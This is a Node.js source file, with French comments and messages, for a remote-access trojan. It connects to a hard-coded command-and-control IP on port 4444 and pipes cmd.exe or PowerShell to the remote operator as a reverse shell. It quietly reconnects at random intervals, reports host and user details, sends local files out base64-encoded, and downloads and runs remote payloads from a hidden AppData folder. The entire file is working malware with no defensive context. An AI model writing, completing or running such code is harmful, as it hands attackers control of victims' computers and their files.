const net = require('net');
const { spawn, exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');

const C2_HOST = '145.223.34.100';
const C2_PORT = 4444;

let currentShell = null;
let clientSocket = null;

function randomDelay() {
  return Math.floor(Math.random() * (8000 - 3000 + 1)) + 3000;
}

function startShell(client, shellType) {
  if (currentShell) currentShell.kill();

  const shellCmd = shellType === 'powershell' ? 'powershell.exe' : 'cmd.exe';
  currentShell = spawn(shellCmd, [], { stdio: ['pipe', 'pipe', 'pipe'] });

  client.write(`[+] Shell ${shellCmd} actif\n`);
  client.pipe(currentShell.stdin);
  currentShell.stdout.pipe(client);
  currentShell.stderr.pipe(client);

  currentShell.on('exit', () => {
    client.write(`[!] Le shell ${shellCmd} s'est terminé.\n`);
  });
}

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (response) => {
      response.pipe(file);
      file.on('finish', () => {
        file.close();
        resolve();
      });
    }).on('error', (err) => {
      fs.unlink(dest, () => {});
      reject(err);
    });
  });
}

// Fonction pour télécharger un fichier local et l'envoyer au C2
function uploadFileToC2(filePath, client) {
  try {
    // Vérifier si le fichier existe
    if (!fs.existsSync(filePath)) {
      client.write(`[!] Erreur: Le fichier ${filePath} n'existe pas\n`);
      return;
    }

    // Obtenir le nom du fichier
    const fileName = path.basename(filePath);
    
    // Lire le fichier et le convertir en base64
    client.write(`[i] Lecture du fichier ${filePath}...\n`);
    
    try {
      const fileContent = fs.readFileSync(filePath);
      const base64Content = fileContent.toString('base64');
      
      // Envoyer le fichier au serveur
      client.write(`[i] Envoi du fichier ${fileName} au serveur...\n`);
      
      // Pauser le shell pour éviter des interférences pendant le transfert
      if (currentShell) {
        currentShell.stdin.pause();
      }
      
      // Format: __DOWNLOAD__ <filename> <base64_content>
      // Attendre un peu pour s'assurer que les messages sont traités dans l'ordre
      setTimeout(() => {
        // Envoyer le marqueur de début suivi du nom de fichier et des données
        const downloadMsg = `__DOWNLOAD__ ${fileName} ${base64Content}`;
        client.write(downloadMsg);
        
        // Rétablir le shell après un court délai
        setTimeout(() => {
          if (currentShell) {
            currentShell.stdin.resume();
          }
          client.write(`\n[+] Fichier ${fileName} envoyé avec succès\n`);
        }, 500);
      }, 200);
    } catch (readError) {
      client.write(`[!] Erreur de lecture: ${readError.message}\n`);
      if (readError.code === 'EACCES') {
        client.write(`[!] Accès refusé au fichier. Vérifiez les permissions.\n`);
      }
    }
  } catch (error) {
    client.write(`[!] Erreur lors de l'envoi du fichier: ${error.message}\n`);
  }
}

async function executeGitHubPayload(url, client) {
  try {
    // Ensure the target directory exists
    const appDataDir = path.join(os.homedir(), 'AppData', 'Roaming', 'onerg');
    if (!fs.existsSync(appDataDir)) {
      fs.mkdirSync(appDataDir, { recursive: true });
    }
    
    // Create filename with timestamp
    const timestamp = Date.now();
    const payloadPath = path.join(appDataDir, `payload_${timestamp}.js`);
    
    client.write(`[i] Téléchargement de ${url}...\n`);
    
    // Download the file
    await downloadFile(url, payloadPath);
    client.write(`[+] Payload téléchargé dans ${payloadPath}\n`);
    
    // Execute the payload and capture output
    client.write(`[i] Exécution du payload...\n`);
    
    return new Promise((resolve) => {
      exec(`node "${payloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          client.write(`[!] Erreur d'exécution: ${error.message}\n`);
        }
        if (stdout) {
          client.write(`[STDOUT] ${stdout}\n`);
        }
        if (stderr) {
          client.write(`[STDERR] ${stderr}\n`);
        }
        client.write(`[+] Exécution terminée\n`);
        resolve();
      });
    });
  } catch (error) {
    client.write(`[!] Erreur: ${error.message}\n`);
  }
}

function handleNativeCommand(cmd, client) {
  const parts = cmd.split(' ');
  if (parts[0] === 'info') {
    const info = {
      platform: os.platform(),
      username: os.userInfo().username,
      uptime: os.uptime(),
      cwd: process.cwd()
    };
    client.write(`[INFO] ${JSON.stringify(info, null, 2)}\n`);
    return true;
  }

  if (parts[0] === 'sleep' && parts[1]) {
    const delay = parseInt(parts[1]) * 1000;
    client.write(`[SLEEP] Pause pendant ${parts[1]}s...\n`);
    currentShell?.kill();
    setTimeout(() => {
      startShell(client, 'cmd');
    }, delay);
    return true;
  }

  if (parts[0] === 'github_exec' && parts[1]) {
    executeGitHubPayload(parts[1], client);
    return true;
  }
  
  if (parts[0] === 'download' && parts.length > 1) {
    // Reconstruire le chemin complet (pour gérer les chemins avec espaces)
    const filePath = parts.slice(1).join(' ');
    uploadFileToC2(filePath, client);
    return true;
  }

  return false;
}

function connect() {
  const client = new net.Socket();

  client.connect(C2_PORT, C2_HOST, () => {
    if (clientSocket) return;

    clientSocket = client;
    client.write(`[OS] ${os.platform()}\n`);
    startShell(client, 'cmd');

    client.on('data', (data) => {
      const input = data.toString();
      const trimmed = input.trim();
      
      // Traiter d'abord les commandes natives avant de les passer au shell
      if (handleNativeCommand(trimmed, client)) {
        // Ne rien faire d'autre si c'est une commande native
        return;
      } else if (trimmed === 'switchshell') {
        const newShell = currentShell.spawnfile.includes('powershell') ? 'cmd' : 'powershell';
        client.write(`[i] Bascule vers ${newShell}...\n`);
        startShell(client, newShell);
      } else {
        // Sinon envoyer au shell
        currentShell.stdin.write(trimmed + '\n');
      }
    });

    client.on('close', () => {
      currentShell = null;
      clientSocket = null;
      setTimeout(connect, randomDelay());
    });

    client.on('error', () => {
      currentShell = null;
      clientSocket = null;
      setTimeout(connect, randomDelay());
    });
  });
}

connect();
